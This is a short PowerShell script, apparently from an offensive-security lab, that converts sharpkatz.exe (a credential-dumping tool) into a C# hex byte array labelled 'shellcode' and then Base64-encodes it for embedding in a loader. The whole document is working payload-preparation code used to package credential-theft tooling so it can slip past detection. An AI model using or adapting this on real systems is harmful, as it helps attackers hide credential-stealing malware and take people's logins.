$fileName = "C:\THEV\Labs\psloader\sharpkatz.exe"
$fileContent = [IO.File]::ReadAllBytes($fileName)

$csharpformat = '0x' + (($fileContent | ForEach-Object ToString x2 | ForEach-Object { $_ + ',' }) -join '0x')
$csharpformat = $csharpformat.SubString(0, $csharpformat.Length-1)
"`nC# formatted shellcode:`n`n" + $csharpformat | add-content ($fileName + ".b64")

$Bytes = [System.Text.Encoding]::UTF8.GetBytes($csharpformat)
$EncodedText =[Convert]::ToBase64String($Bytes)
"`nBase64 Encoded C# shellcode:`n`n" + $EncodedText | add-content ($fileName + ".b64")